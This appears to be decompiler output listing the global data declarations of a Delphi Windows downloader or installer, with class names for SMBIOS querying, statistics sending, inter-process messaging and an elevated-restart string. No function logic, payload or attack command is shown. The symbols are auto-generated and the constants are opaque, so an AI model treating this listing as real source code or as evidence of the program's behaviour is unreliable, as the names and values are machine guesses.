_UNKNOWN loc_442820; // weak
_UNKNOWN loc_4428B6; // weak
_UNKNOWN loc_4428BD; // weak
_UNKNOWN loc_442A70; // weak
_UNKNOWN loc_442A77; // weak
_UNKNOWN loc_442B40; // weak
_UNKNOWN loc_442B47; // weak
int dword_442B54[7] = { 1413092369, 1667853909, 1382376559, 1936287589, 779711092, 78138, 0 }; // weak
_UNKNOWN loc_442D0C; // weak
_UNKNOWN loc_442D13; // weak
char byte_449200 = '\x0E'; // weak
char byte_44923C = '\x11'; // weak
char byte_449278 = '\x0E'; // weak
int dword_44931C[6] = { 1413091345, 1851880020, 1952541811, 778989417, 274746, 0 }; // weak
char byte_449354 = '\x0E'; // weak
int (*cls_VersionUtil_TStringFileInfoBlock[3])() = { &sub_44A4A0, &sub_44A450, &sub_44A780 }; // weak
int (*cls_VersionUtil_TVarFileInfoBlock[3])() = { &sub_44A9C0, &sub_44A970, &sub_44ABD0 }; // weak
char byte_4495EC = '\x11'; // weak
__int16 cls_VersionUtil_TVersionInfo = 14; // weak
_UNKNOWN loc_4497BE; // weak
_UNKNOWN loc_4497C5; // weak
_UNKNOWN loc_4499EB; // weak
_UNKNOWN loc_4499F2; // weak
_UNKNOWN loc_449A1B; // weak
_UNKNOWN loc_449A22; // weak
_UNKNOWN loc_449DDB; // weak
_UNKNOWN loc_449DE2; // weak
_UNKNOWN loc_449DF9; // weak
_UNKNOWN loc_449E00; // weak
_UNKNOWN loc_449E20; // weak
_UNKNOWN loc_449E27; // weak
_UNKNOWN loc_44A029; // weak
_UNKNOWN loc_44A030; // weak
_UNKNOWN loc_44A219; // weak
_UNKNOWN loc_44A220; // weak
_UNKNOWN loc_44A76C; // weak
_UNKNOWN loc_44A773; // weak
_UNKNOWN loc_44A95D; // weak
_UNKNOWN loc_44A964; // weak
_UNKNOWN loc_44AB97; // weak
_UNKNOWN loc_44AB9E; // weak
_UNKNOWN loc_44AD05; // weak
_UNKNOWN loc_44AD0C; // weak
_UNKNOWN loc_44AD77; // weak
char byte_44ADC4 = '\x11'; // weak
_UNKNOWN loc_44AF69; // weak
_UNKNOWN loc_44AF70; // weak
_UNKNOWN loc_44AF86; // weak
_UNKNOWN loc_44AF8D; // weak
int dword_44AF98[2] = { 92, 4230502 }; // weak
_UNKNOWN loc_44B066; // weak
_UNKNOWN loc_44B1EB; // weak
_UNKNOWN loc_44B1F2; // weak
int dword_44B254 = 0; // weak
_UNKNOWN loc_44B451; // weak
_UNKNOWN loc_44B458; // weak
_UNKNOWN loc_44B86B; // weak
_UNKNOWN loc_44B872; // weak
_strings str___15[1] = { { -1, 1, "-" } }; // weak
_UNKNOWN loc_44B99E; // weak
_UNKNOWN loc_44B9A5; // weak
_UNKNOWN loc_44BE4A; // weak
_UNKNOWN loc_44BE51; // weak
_UNKNOWN loc_44BE79; // weak
_UNKNOWN loc_44BE80; // weak
int dword_44BF64[5] = { 1024, 4096, 132272, -1, 33 }; // weak
void *off_44BFC8 = (void *)0x450020; // weak
_UNKNOWN loc_44C343; // weak
_UNKNOWN loc_44C34A; // weak
_UNKNOWN loc_44C384; // weak
_UNKNOWN loc_44C38B; // weak
_UNKNOWN loc_44C3B1; // weak
_UNKNOWN loc_44C3B8; // weak
int dword_44C3C0[4] = { 1040, 4112, 1024, 4096 }; // weak
_UNKNOWN loc_44C512; // weak
_UNKNOWN loc_44C567; // weak
_UNKNOWN loc_44C56E; // weak
_strings str___3[1] = { { -1, 1, "." } }; // weak
_UNKNOWN loc_44C8E2; // weak
_UNKNOWN loc_44C983; // weak
_UNKNOWN loc_44C98A; // weak
_UNKNOWN loc_44C9A0; // weak
_UNKNOWN loc_44C9A7; // weak
_UNKNOWN loc_44C9CF; // weak
_UNKNOWN loc_44C9D6; // weak
int dword_44CB44[4] = { 92, 132272, -1, 1 }; // weak
int dword_44CB54[4] = { 93, 132272, -1, 1 }; // weak
int dword_44CB64[4] = { 64, 132272, -1, 1 }; // weak
_UNKNOWN loc_44CE7F; // weak
_UNKNOWN loc_44CEC9; // weak
_UNKNOWN loc_44CED0; // weak
_UNKNOWN loc_44D14D; // weak
_UNKNOWN loc_44D154; // weak
_UNKNOWN loc_44D3C9; // weak
_UNKNOWN loc_44D3D0; // weak
int dword_44D404[4] = { 99, 132272, -1, 1 }; // weak
int dword_44D414[4] = { 58, 132272, -1, 9 }; // weak
_UNKNOWN loc_44D960; // weak
_UNKNOWN loc_44D967; // weak
_UNKNOWN loc_44D9F0; // weak
_UNKNOWN loc_44D9F7; // weak
_UNKNOWN loc_44DB72; // weak
_UNKNOWN loc_44DB79; // weak
int dword_44DB80 = 0; // weak
int dword_44DBAC = 97; // weak
_UNKNOWN loc_44DDC3; // weak
int dword_44DE14 = 95; // weak
int dword_44DE18 = 0; // weak
_UNKNOWN loc_44E0A8; // weak
_UNKNOWN loc_44E0AF; // weak
_UNKNOWN loc_44E14A; // weak
_UNKNOWN loc_44E151; // weak
_UNKNOWN loc_44E26D; // weak
_UNKNOWN loc_44E393; // weak
_UNKNOWN loc_44E39A; // weak
_UNKNOWN loc_44E440; // weak
_UNKNOWN loc_44E447; // weak
__int16 cls_WinSecureUtil_TWinSecurityToken = 0; // weak
__int16 cls_WinSecureUtil_TWinSecurityId = 0; // weak
int (*cls_WinSecureUtil_TWinSecurityFileACL)() = &sub_450860; // weak
int (__stdcall *cls_WinSecureUtil_TWinSecureFile)(int) = &sub_44EE20; // weak
int dword_44EA4C = 44; // weak
_UNKNOWN loc_44EAD8; // weak
_UNKNOWN loc_44EADF; // weak
_UNKNOWN loc_44EB5F; // weak
_UNKNOWN loc_44EB66; // weak
_UNKNOWN loc_44EB7C; // weak
_UNKNOWN loc_44EB83; // weak
_UNKNOWN loc_44EC68; // weak
_UNKNOWN loc_44EC6F; // weak
_UNKNOWN loc_44ECC9; // weak
_UNKNOWN loc_44ECD0; // weak
_UNKNOWN loc_44ECE6; // weak
_UNKNOWN loc_44ECED; // weak
_UNKNOWN loc_44EF2F; // weak
_UNKNOWN loc_44EF36; // weak
_UNKNOWN loc_44F010; // weak
_UNKNOWN loc_44F017; // weak
_UNKNOWN loc_44F33E; // weak
_UNKNOWN loc_44F345; // weak
_UNKNOWN loc_44F55C; // weak
_UNKNOWN loc_44F563; // weak
_UNKNOWN loc_44F946; // weak
_UNKNOWN loc_44F9A3; // weak
_UNKNOWN def_44FAEB; // weak
_UNKNOWN loc_44FF3E; // weak
_UNKNOWN loc_44FF45; // weak
_UNKNOWN loc_44FFBE; // weak
_UNKNOWN loc_44FFC5; // weak
_UNKNOWN loc_4500D2; // weak
_UNKNOWN loc_4500D9; // weak
_UNKNOWN loc_450220; // weak
_UNKNOWN loc_450227; // weak
_UNKNOWN loc_4504A9; // weak
_UNKNOWN loc_4504B0; // weak
int dword_450ADC[5] = { 1413092369, 1229081939, 1632916303, 1147497570, 778269541 }; // weak
char byte_450B18 = '\x0E'; // weak
__int16 cls_SMBIOSUtil_TSMBIOSClient = 14; // weak
_UNKNOWN loc_450DFB; // weak
_UNKNOWN loc_450E02; // weak
_UNKNOWN loc_450FE6; // weak
_UNKNOWN loc_450FED; // weak
int dword_451020 = 0; // weak
_UNKNOWN loc_4511B2; // weak
_UNKNOWN loc_4511B9; // weak
_UNKNOWN loc_45146E; // weak
_UNKNOWN loc_451475; // weak
_UNKNOWN loc_451492; // weak
_UNKNOWN loc_451499; // weak
_UNKNOWN loc_4514AF; // weak
_UNKNOWN loc_4514B6; // weak
_UNKNOWN loc_4514E4; // weak
_UNKNOWN loc_4514EB; // weak
_UNKNOWN loc_451563; // weak
int dword_45158C = 93; // weak
_UNKNOWN loc_451674; // weak
_UNKNOWN loc_45167B; // weak
_UNKNOWN loc_4517D1; // weak
_UNKNOWN loc_451877; // weak
_UNKNOWN loc_45187E; // weak
_UNKNOWN loc_4519B9; // weak
_UNKNOWN loc_4519C0; // weak
int dword_4519D8[4] = { 95, 132272, -1, 2 }; // weak
_UNKNOWN loc_451A4C; // weak
_UNKNOWN loc_451B01; // weak
char byte_451D34 = '\x11'; // weak
__int16 cls_StatRootUtil_TStatRootSendingInfo = 14; // weak
_UNKNOWN loc_452580; // weak
int dword_4525B0[4] = { 9, 66787, -1, 7 }; // weak
int dword_4525D4[4] = { 3831397, 66787, -1, 3 }; // weak
int dword_4525E4[4] = { 3828785, 66787, -1, 5 }; // weak
_strings str___17[1] = { { -1, 1, " " } }; // weak
_UNKNOWN loc_452897; // weak
_UNKNOWN loc_4528CE; // weak
_UNKNOWN loc_4528D5; // weak
_UNKNOWN loc_452A72; // weak
_UNKNOWN loc_452A79; // weak
_UNKNOWN loc_452A8F; // weak
_UNKNOWN loc_452A96; // weak
_UNKNOWN loc_452B52; // weak
_UNKNOWN loc_452B59; // weak
_UNKNOWN loc_452C80; // weak
_UNKNOWN loc_452C87; // weak
int dword_452C98[4] = { 124, 66787, -1, 2 }; // weak
_UNKNOWN loc_4531A6; // weak
_UNKNOWN loc_4531AD; // weak
_UNKNOWN loc_453220; // weak
_UNKNOWN loc_453227; // weak
_UNKNOWN loc_453368; // weak
_UNKNOWN loc_45336F; // weak
_UNKNOWN loc_4533E8; // weak
_UNKNOWN loc_4533EF; // weak
int dword_4534FC[4] = { 10, 66787, -1, 8 }; // weak
_UNKNOWN loc_453645; // weak
_UNKNOWN loc_45364C; // weak
_UNKNOWN loc_453716; // weak
__int16 cls_InterComUtil_TICMessageZeroData = 0; // weak
__int16 cls_InterComUtil_TICMessageMemoryStreamData = 0; // weak
__int16 cls_InterComUtil_TICMessageAlignMemData = 0; // weak
__int16 cls_InterComUtil_TICMessage = 14; // weak
int (__fastcall *off_454328)(Ibservices::TLicenseMaskInfo *this) = &sub_454500; // weak
_UNKNOWN loc_45496E; // weak
_UNKNOWN loc_454975; // weak
_UNKNOWN loc_454B3B; // weak
_UNKNOWN loc_454B42; // weak
_UNKNOWN loc_454D95; // weak
_UNKNOWN loc_454D9C; // weak
int (*cls_InterComClientUtil_TICClientPipe[2])() = { &sub_455240, &sub_4552D0 }; // weak
int (*cls_InterComClientUtil_TICClientThread[2])() = { &sub_455530, &sub_43DD50 }; // weak
__int16 cls_InterComClientUtil_TICClient = 14; // weak
_UNKNOWN loc_455211; // weak
_UNKNOWN loc_455218; // weak
_UNKNOWN loc_4552B9; // weak
_UNKNOWN loc_4552C0; // weak
_UNKNOWN loc_455465; // weak
_UNKNOWN loc_455473; // weak
_UNKNOWN loc_4555F3; // weak
_UNKNOWN loc_455638; // weak
_UNKNOWN loc_45563F; // weak
_UNKNOWN loc_455655; // weak
_UNKNOWN loc_45565C; // weak
_UNKNOWN loc_4557CE; // weak
_UNKNOWN loc_4557D5; // weak
_UNKNOWN loc_45585F; // weak
_UNKNOWN loc_455866; // weak
_UNKNOWN loc_45593D; // weak
_UNKNOWN loc_455994; // weak
_UNKNOWN loc_4559B4; // weak
_UNKNOWN loc_4559BB; // weak
_UNKNOWN loc_455A04; // weak
_UNKNOWN loc_455A0B; // weak
_UNKNOWN loc_455A8E; // weak
_UNKNOWN loc_455A95; // weak
_UNKNOWN loc_455B45; // weak
_UNKNOWN loc_455B4C; // weak
_UNKNOWN loc_455B65; // weak
_UNKNOWN loc_455B6C; // weak
_UNKNOWN loc_455BD5; // weak
_UNKNOWN loc_455BDC; // weak
__int16 cls_InterComDispatchUtil_TICXmlDispatchMap = 14; // weak
_UNKNOWN loc_455EFA; // weak
_UNKNOWN loc_455F01; // weak
_UNKNOWN loc_45613E; // weak
_UNKNOWN loc_456145; // weak
_UNKNOWN loc_45615B; // weak
_UNKNOWN loc_456162; // weak
_UNKNOWN loc_456185; // weak
_UNKNOWN loc_45618C; // weak
int (*cls_DownloaderInterprocessScheme_TXML_SelfServiceInstallerCommandLine[3])() = { &sub_429DC0, &sub_429C60, &sub_429DD0 }; // weak
int (*cls_DownloaderInterprocessScheme_TXML_SelfServiceCommandLineFiles_FileName[3])() = { &sub_429DC0, &sub_429C60, &sub_429DD0 }; // weak
int (*cls_DownloaderInterprocessScheme_TXML_SelfServiceCloseApplication[3])() = { &sub_429DC0, &sub_429C60, &sub_429DD0 }; // weak
_UNKNOWN loc_456D68; // weak
_UNKNOWN loc_456D6F; // weak
_UNKNOWN loc_456D85; // weak
_UNKNOWN loc_456D8C; // weak
_UNKNOWN loc_456DAF; // weak
_UNKNOWN loc_456DB6; // weak
__int16 cls_DownloaderInterprocess_TSelfServiceClient = 14; // weak
int (*cls_DownloaderInterprocess_TSendMsgLoopThread[2])() = { &sub_4578C0, &sub_43DD50 }; // weak
_UNKNOWN loc_4572E5; // weak
_UNKNOWN loc_4572EC; // weak
_UNKNOWN loc_457569; // weak
_UNKNOWN loc_457570; // weak
_UNKNOWN loc_457586; // weak
_UNKNOWN loc_45758D; // weak
_UNKNOWN loc_457699; // weak
_UNKNOWN loc_4576A0; // weak
_UNKNOWN loc_4576BB; // weak
_UNKNOWN loc_4576C2; // weak
_UNKNOWN loc_457942; // weak
_UNKNOWN loc_457949; // weak
_UNKNOWN loc_457A97; // weak
_UNKNOWN loc_457A9E; // weak
_UNKNOWN loc_457BBA; // weak
_UNKNOWN loc_457BC1; // weak
_UNKNOWN loc_457C3A; // weak
_UNKNOWN loc_457C41; // weak
_UNKNOWN loc_457D49; // weak
_UNKNOWN loc_457D50; // weak
_UNKNOWN loc_457DBE; // weak
_UNKNOWN loc_457DC5; // weak
_UNKNOWN loc_457DDB; // weak
_UNKNOWN loc_457DE2; // weak
int (*cls_MiniStatUtil_TInstallerStatRootSender[3])() = { &sub_459BC0, &sub_453800, &Idftp::TIdFTP::SetCMDOpt }; // weak
_UNKNOWN loc_45832B; // weak
_UNKNOWN loc_458332; // weak
_UNKNOWN loc_4586DC; // weak
_UNKNOWN loc_4586FA; // weak
_UNKNOWN loc_458701; // weak
_UNKNOWN loc_458734; // weak
_UNKNOWN loc_45873B; // weak
void *off_45878C = &loc_450047; // weak
_UNKNOWN loc_4589FE; // weak
_UNKNOWN loc_458A05; // weak
_UNKNOWN loc_458CDD; // weak
_UNKNOWN loc_458CE4; // weak
int dword_458CFC[4] = { 26, 132272, -1, 1 }; // weak
_UNKNOWN loc_458DA2; // weak
_UNKNOWN loc_458DA9; // weak
_UNKNOWN loc_458ED7; // weak
_UNKNOWN loc_458F12; // weak
_UNKNOWN loc_458F19; // weak
int dword_458F3C = 125; // weak
_UNKNOWN loc_458FE7; // weak
_UNKNOWN loc_458FEE; // weak
int dword_459024[4] = { 99, 132272, -1, 1 }; // weak
int dword_459034[3] = { 58, -2138216860, 0 }; // weak
_UNKNOWN loc_4590EE; // weak
_UNKNOWN loc_4590F5; // weak
_UNKNOWN loc_459113; // weak
_UNKNOWN loc_45911A; // weak
_UNKNOWN loc_459277; // weak
_UNKNOWN loc_45927E; // weak
_UNKNOWN loc_459288; // weak
_UNKNOWN loc_4593A0; // weak
_UNKNOWN loc_459405; // weak
_UNKNOWN loc_45940C; // weak
int dword_45948C[4] = { 13, 132272, -1, 1 }; // weak
int dword_45949C[4] = { 123, 132272, -1, 1 }; // weak
int dword_4594AC = 125; // weak
int dword_4595D8[4] = { 13, 66787, -1, 2 }; // weak
int dword_4595E8[2] = { 8250, 66787 }; // weak
_strings str___18[1] = { { -1, 1, " " } }; // weak
_UNKNOWN loc_459741; // weak
_UNKNOWN loc_459868; // weak
_UNKNOWN loc_45986F; // weak
_UNKNOWN loc_459A55; // weak
_UNKNOWN loc_459C81; // weak
_UNKNOWN loc_459DFC; // weak
_UNKNOWN loc_459E03; // weak
_UNKNOWN loc_459E7C; // weak
_UNKNOWN loc_459E83; // weak
_UNKNOWN loc_459E99; // weak
_UNKNOWN loc_459EA0; // weak
_UNKNOWN loc_459EF5; // weak
int (__stdcall *cls_DownloaderSetupBody_TInstallerDebug)(int, int, int) = &sub_45EA60; // weak
_UNKNOWN loc_45A18B; // weak
int dword_45A1C8[10] =
{
  70452248,
  71173184,
  71173170,
  2098233,
  70583366,
  71435325,
  1088,
  132272,
  -1,
  3
}; // weak
_UNKNOWN loc_45A3BA; // weak
_UNKNOWN loc_45A3D7; // weak
_UNKNOWN loc_45A4B1; // weak
_UNKNOWN loc_45A50D; // weak
_UNKNOWN loc_45A514; // weak
_UNKNOWN loc_45A52A; // weak
_UNKNOWN loc_45A531; // weak
_UNKNOWN loc_45A60D; // weak
_UNKNOWN loc_45A614; // weak
int dword_45A624[3] = { 126, -2138216860, 0 }; // weak
_UNKNOWN loc_45A762; // weak
_UNKNOWN loc_45A769; // weak
_UNKNOWN loc_45A784; // weak
_UNKNOWN loc_45A78B; // weak
_UNKNOWN loc_45A8FC; // weak
_UNKNOWN loc_45A903; // weak
_UNKNOWN loc_45A946; // weak
_UNKNOWN loc_45A94D; // weak
int dword_45A978[2] = { 126, 4230502 }; // weak
_UNKNOWN loc_45A9E9; // weak
_UNKNOWN loc_45A9F0; // weak
_UNKNOWN loc_45ABA1; // weak
_UNKNOWN loc_45ABA8; // weak
_UNKNOWN loc_45ABD6; // weak
_UNKNOWN loc_45ABDD; // weak
_UNKNOWN loc_45AC77; // weak
_UNKNOWN loc_45AC7E; // weak
_UNKNOWN loc_45AE94; // weak
_UNKNOWN loc_45AEEB; // weak
_UNKNOWN loc_45AEF2; // weak
_UNKNOWN loc_45B090; // weak
_UNKNOWN loc_45B0E2; // weak
_UNKNOWN loc_45B0E9; // weak
_UNKNOWN loc_45B1ED; // weak
_UNKNOWN loc_45B1F4; // weak
_UNKNOWN loc_45B2B3; // weak
_UNKNOWN loc_45B413; // weak
_UNKNOWN loc_45B689; // weak
_UNKNOWN loc_45B694; // weak
_UNKNOWN loc_45B880; // weak
_UNKNOWN loc_45B887; // weak
_UNKNOWN loc_45BB0E; // weak
_UNKNOWN loc_45BB15; // weak
_UNKNOWN loc_45BC51; // weak
_UNKNOWN loc_45BC76; // weak
_UNKNOWN loc_45BC7D; // weak
_UNKNOWN loc_45BE12; // weak
_UNKNOWN loc_45BE19; // weak
_UNKNOWN loc_45BF2A; // weak
_UNKNOWN loc_45BF31; // weak
_strings str___7[1] = { { -1, 1, "." } }; // weak
_UNKNOWN loc_45C03F; // weak
_UNKNOWN loc_45C046; // weak
_strings str___19[1] = { { -1, 1, " " } }; // weak
_UNKNOWN loc_45C12A; // weak
_UNKNOWN loc_45C131; // weak
_UNKNOWN loc_45C2CE; // weak
int dword_45C334[4] = { 41, 132272, -1, 10 }; // weak
const WCHAR Value = 0u; // idb
_UNKNOWN loc_45C5C7; // weak
_UNKNOWN loc_45C5CE; // weak
_UNKNOWN loc_45C745; // weak
int dword_45C7F8 = 0; // weak
int dword_45C834[3] = { 34, -2138216860, 0 }; // weak
_UNKNOWN loc_45C909; // weak
_UNKNOWN loc_45C910; // weak
_UNKNOWN loc_45C943; // weak
_UNKNOWN loc_45C94A; // weak
_UNKNOWN loc_45CA2F; // weak
_UNKNOWN loc_45CA36; // weak
_UNKNOWN loc_45CAF7; // weak
_UNKNOWN loc_45CAFE; // weak
_strings str___20[1] = { { -1, 1, " " } }; // weak
_UNKNOWN loc_45CCF1; // weak
_UNKNOWN loc_45CCF8; // weak
wchar_t aDoRestartInEle[27] = L"Do restart in elevated mode"; // weak
_UNKNOWN loc_45CF97; // weak
_UNKNOWN loc_45CF9E; // weak
_UNKNOWN loc_45D1FE; // weak
_UNKNOWN loc_45D205; // weak
_UNKNOWN loc_45D2F4; // weak
_UNKNOWN loc_45D2FB; // weak
_UNKNOWN loc_45DDF2; // weak
_UNKNOWN loc_45DDF9; // weak
_UNKNOWN loc_45E029; // weak
_UNKNOWN loc_45E192; // weak
_UNKNOWN loc_45E199; // weak
int dword_45E310[4] = { 49, 132272, -1, 15 }; // weak
int dword_45E370[2] = { 34, 132272 }; // weak
_strings str___22[1] = { { -1, 1, " " } }; // weak
_UNKNOWN loc_45E941; // weak
_UNKNOWN loc_45E9F4; // weak
_UNKNOWN loc_45E9FB; // weak
_UNKNOWN loc_45EA13; // weak
_UNKNOWN loc_45EA1A; // weak
_UNKNOWN loc_45EA35; // weak
_UNKNOWN loc_45EA3C; // weak
_UNKNOWN loc_45EAEC; // weak
_UNKNOWN loc_45EAF3; // weak
_UNKNOWN loc_45EBB7; // weak
_UNKNOWN loc_45EBF1; // weak
_UNKNOWN loc_45ECF6; // weak
_UNKNOWN loc_45ECFD; // weak
_strings str___9[1] = { { -1, 1, "." } }; // weak
_UNKNOWN loc_45EE31; // weak
_UNKNOWN loc_4640D7; // weak
_UNKNOWN loc_464552; // weak
_UNKNOWN loc_46462F; // weak
_UNKNOWN loc_464732; // weak
_UNKNOWN loc_464739; // weak
_UNKNOWN loc_464795; // weak
int dword_4647AC = 48; // weak
int dword_465000 = 0; // weak
int dword_465004 = 0; // weak
char byte_46500C = '\x02'; // weak
int dword_46502C = 6400; // weak
char byte_465032 = '\0'; // weak
int (__fastcall *dword_465034)(_DWORD, _DWORD) = NULL; // weak
int dword_46503C = 0; // weak
int dword_465040 = 0; // weak
_DWORD dword_465044[4] = { -824236834, 1149075620, -2014612084, -48119523 }; // weak
int off_465054 = 4206608; // idb
int off_465058 = 4206652; // idb
int off_46505C = 4206692; // idb
int off_465060 = 4206756; // idb
int off_465064 = 4206768; // idb
int off_465068 = 4206776; // idb
int off_46506C = 4206788; // idb
LPCVOID lpBuffer = (LPCVOID)0x4030D4; // idb
LPCSTR lpCaption = (LPCSTR)0x4030D8; // idb
_UNKNOWN unk_465078; // weak
_UNKNOWN unk_46507A; // weak
int (*off_465094)() = &System::_16461; // weak
CHAR Caption[] = "Error"; // idb
CHAR Text[] = "Runtime error     at 00000000"; // idb
char byte_4659E7[] = { '0' }; // weak
int (*off_4659F8[2])[4] = { &dword_4074CC, &dword_4074E8 }; // weak
int (*off_4659FC)[4] = &dword_4074E8; // weak
void *dword_465C08 = NULL; // idb
int dword_465C10 = 0; // weak
HLOCAL hMem = NULL; // idb
_UNKNOWN unk_465C38; // weak
_UNKNOWN unk_465C58; // weak
int dword_465C88 = 0; // weak
int dword_465C8C = 0; // weak
int dword_465C90 = 0; // weak
_DWORD dword_465DB8 = 0; // weak
_UNKNOWN unk_465DBC; // weak
_DWORD dword_465DC0 = 0; // weak
int dword_465DC4 = 0; // weak
int dword_465DC8 = 0; // weak
int dword_465DCC = 0; // weak
int dword_465DD0 = 0; // weak
_DWORD dword_465DD4 = 0; // weak
int dword_465E08 = 0; // weak
int *off_465E28 = &dword_4141DC; // weak
float flt_465E30 = 3.4028235e38; // weak
float flt_465E34 = -3.4028235e38; // weak
double dbl_465E38 = 1.797693134862316e308; // weak
double dbl_465E40 = -1.797693134862316e308; // weak
int dword_465E48[] = { 3145776 }; // weak
int dword_465FD8[] = { 3145776 }; // weak
__int16 word_4663D8[16] = { 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 65, 66, 67, 68, 69, 70 }; // weak
DWORD dwDesiredAccess[3] = { 2147483648u, 1073741824u, 3221225472u }; // weak
DWORD dwShareMode[5] = { 0u, 0u, 1u, 2u, 3u }; // weak
int **off_466420[2] = { &off_40CA20, &off_40CA28 }; // weak
int dword_46643C = 10; // weak
int dword_466448 = 86400000; // weak
wchar_t aD[4] = L"%.*d"; // weak
int **off_466454[38] =
{
  &off_40CB30,
  &off_40CB38,
  &off_40CB40,
  &off_40CB48,
  &off_40CB50,
  &off_40CB58,
  &off_40CB60,
  &off_40CB68,
  &off_40CB70,
  &off_40CB78,
  &off_40CB80,
  &off_40CB88,
  &off_40CB90,
  &off_40CB98,
  &off_40CBA0,
  &off_40CBA8,
  &off_40CBB0,
  &off_40CBB8,
  &off_40CBC0,
  &off_40CBC8,
  &off_40CBD0,
  &off_40CBD8,
  &off_40CBE0,
  &off_40CBE8,
  &off_40CBF0,
  &off_40CBF8,
  &off_40CC00,
  &off_40CC08,
  &off_40CC10,
  &off_40CC18,
  &off_40CC20,
  &off_40CC28,
  &off_40CC30,
  &off_40CC38,
  &off_40CC40,
  &off_40CC48,
  &off_40CC50,
  &off_40CC58
}; // weak
int **off_466484[26] =
{
  &off_40CB90,
  &off_40CB98,
  &off_40CBA0,
  &off_40CBA8,
  &off_40CBB0,
  &off_40CBB8,
  &off_40CBC0,
  &off_40CBC8,
  &off_40CBD0,
  &off_40CBD8,
  &off_40CBE0,
  &off_40CBE8,
  &off_40CBF0,
  &off_40CBF8,
  &off_40CC00,
  &off_40CC08,
  &off_40CC10,
  &off_40CC18,
  &off_40CC20,
  &off_40CC28,
  &off_40CC30,
  &off_40CC38,
  &off_40CC40,
  &off_40CC48,
  &off_40CC50,
  &off_40CC58
}; // weak
int **off_4664B4[14] =
{
  &off_40CBF0,
  &off_40CBF8,
  &off_40CC00,
  &off_40CC08,
  &off_40CC10,
  &off_40CC18,
  &off_40CC20,
  &off_40CC28,
  &off_40CC30,
  &off_40CC38,
  &off_40CC40,
  &off_40CC48,
  &off_40CC50,
  &off_40CC58
}; // weak
int **off_4664D0[7] =
{
  &off_40CC28,
  &off_40CC30,
  &off_40CC38,
  &off_40CC40,
  &off_40CC48,
  &off_40CC50,
  &off_40CC58
}; // weak
int (*off_466524)() = &sub_41B108; // weak
_DWORD *dword_466538 = NULL; // weak
_DWORD dword_466564 = 0; // weak
char byte_466568[4] = { '\0', '\x01', '\0', '\0' }; // weak
int dword_46657C[] = { -2147352571 }; // weak
char byte_466584 = '\x01'; // weak
int dword_466588 = 0; // weak
int dword_466590 = -1; // weak
wchar_t *off_466594 = L"Empty"; // weak
unsigned __int8 byte_4665EC[20] =
{
  0u,
  1u,
  0u,
  1u,
  0u,
  1u,
  1u,
  0u,
  0u,
  1u,
  1u,
  0u,
  0u,
  0u,
  1u,
  0u,
  1u,
  1u,
  0u,
  0u
}; // weak
void *off_466600 = &aKernel32Dll_1; // idb
int dword_466700 = 0; // weak
int dword_466704 = 0; // weak
int dword_466708 = 0; // weak
int dword_46670C = 0; // weak
int dword_466710 = 0; // weak
int dword_466714 = 0; // weak
int dword_466718 = 0; // weak
int dword_46671C = 0; // weak
int dword_466720 = 0; // weak
int dword_466724 = 0; // weak
int dword_466728 = 0; // weak
int dword_46672C = 0; // weak
int dword_466730 = 0; // weak
int dword_466734 = 0; // weak
int dword_466738 = 0; // weak
int dword_46673C = 0; // weak
int dword_466740 = 0; // weak
int dword_466744 = 0; // weak
int dword_466748 = 0; // weak
int dword_46674C = 0; // weak
int dword_466750 = 0; // weak
int dword_466754 = 0; // weak
int dword_466758 = 0; // weak
int dword_46675C = 0; // weak
int dword_466760 = 0; // weak
int dword_466764 = 0; // weak
int dword_466768 = 0; // weak
int dword_46676C = 0; // weak
int dword_466770 = 0; // weak
int dword_466774 = 0; // weak
int dword_466778 = 0; // weak
int dword_46677C = 0; // weak
int dword_466780 = 0; // weak
int dword_466784 = 0; // weak
int dword_466788 = 0; // weak
int dword_46678C = 0; // weak
int dword_466790 = 0; // weak
int dword_466794 = 0; // weak
int dword_466798 = 0; // weak
int dword_46679C = 0; // weak
int dword_4667A0 = 0; // weak
int dword_4667A4 = 0; // weak
int dword_4667A8 = 0; // weak
int dword_4667AC = 0; // weak
int dword_4667B0 = 0; // weak
int dword_4667B4 = 0; // weak
int dword_4667B8 = 0; // weak
int dword_4667BC = 0; // weak
int dword_4667C0 = 0; // weak
int dword_4667C4 = 0; // weak
int dword_4667C8 = 0; // weak
int dword_4667CC = 0; // weak
int dword_4667D0 = 0; // weak
int dword_4667D4 = 0; // weak
int dword_4667D8 = 0; // weak
int dword_4667DC = 0; // weak
int dword_4667E0 = -1; // weak
__int64 qword_466808 = 0i64; // weak
__int64 qword_466810 = 0i64; // weak
__int64 qword_466818 = 0i64; // weak
__int64 qword_466820 = 0i64; // weak
int (__fastcall *dword_466828)(_DWORD, _DWORD) = NULL; // weak
char byte_466830 = '\0'; // weak
__int64 (__cdecl *dword_466834)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_466838 = 0; // weak
void *off_46683C = &off_423760; // weak
wchar_t *off_466840[3] = { L"MB", L"GB", &off_42379C }; // weak
wchar_t *off_466844[2] = { L"GB", &off_42379C }; // weak
void **off_466848 = &off_42379C; // weak
__int16 word_46684C[69] =
{
  12336,
  12592,
  12848,
  13104,
  13360,
  13616,
  13872,
  14128,
  14384,
  14640,
  12337,
  12593,
  12849,
  13105,
  13361,
  13617,
  13873,
  14129,
  14385,
  14641,
  12338,
  12594,
  12850,
  13106,
  13362,
  13618,
  13874,
  14130,
  14386,
  14642,
  12339,
  12595,
  12851,
  13107,
  13363,
  13619,
  13875,
  14131,
  14387,
  14643,
  12340,
  12596,
  12852,
  13108,
  13364,
  13620,
  13876,
  14132,
  14388,
  14644,
  12341,
  12597,
  12853,
  13109,
  13365,
  13621,
  13877,
  14133,
  14389,
  14645,
  12342,
  12598,
  12854,
  13110,
  13366,
  13622,
  13878,
  14134,
  14390
}; // weak
__int16 word_4668D6[31] =
{
  14646,
  12343,
  12599,
  12855,
  13111,
  13367,
  13623,
  13879,
  14135,
  14391,
  14647,
  12344,
  12600,
  12856,
  13112,
  13368,
  13624,
  13880,
  14136,
  14392,
  14648,
  12345,
  12601,
  12857,
  13113,
  13369,
  13625,
  13881,
  14137,
  14393,
  14649
}; // weak
int dword_466914 = 0; // weak
int dword_466918 = 0; // weak
int dword_46691C = 0; // weak
int dword_466920 = 0; // weak
char byte_466924 = '\0'; // weak
int dword_466928 = 0; // weak
char byte_46692C = '\0'; // weak
char byte_46692D = '\0'; // weak
int dword_466930 = 0; // weak
char byte_466934 = '\0'; // weak
char byte_466935 = '\0'; // weak
int qword_4669A8 = 1024; // idb
__int64 qword_4669B0 = 1048576i64; // idb
__int64 qword_4669B8 = 1073741824i64; // idb
__int64 qword_4669C0 = 1099511627776i64; // idb
__int64 qword_4669C8 = -8446744073709551616i64; // weak
